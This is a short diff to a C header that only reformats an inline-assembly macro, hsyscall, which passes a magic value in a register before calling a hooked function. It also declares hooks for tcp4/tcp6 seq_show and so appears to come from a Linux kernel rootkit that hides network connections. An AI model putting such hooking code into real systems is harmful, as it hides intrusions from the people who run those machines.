@@ -10,13 +10,14 @@ void *hooks_find(const char *symbol);
     o = hooks_find(n);                                                                                                 \
   }
 
-#define hsyscall(o) asm("mov %1, %%r15;" \
-                        "mov %2, %%rdi;" \
-                        "call *%3;"      \
-                        "mov %%rax, %0" \
-                        : "=m"(ret) \
-                        : "i"(SHRK_MAGIC_R15), "r"(r), "m"(o) \
-                        : "%r15", "%rdi", "%rax");
+#define hsyscall(o)                                                                                                    \
+  asm("mov %1, %%r15;"                                                                                                 \
+      "mov %2, %%rdi;"                                                                                                 \
+      "call *%3;"                                                                                                      \
+      "mov %%rax, %0"                                                                                                  \
+      : "=m"(ret)                                                                                                      \
+      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(o)                                                                            \
+      : "%r15", "%rdi", "%rax");
 
 asmlinkage int32_t h_tcp4_seq_show(struct seq_file *seq, void *v);
 asmlinkage int32_t h_tcp6_seq_show(struct seq_file *seq, void *v);
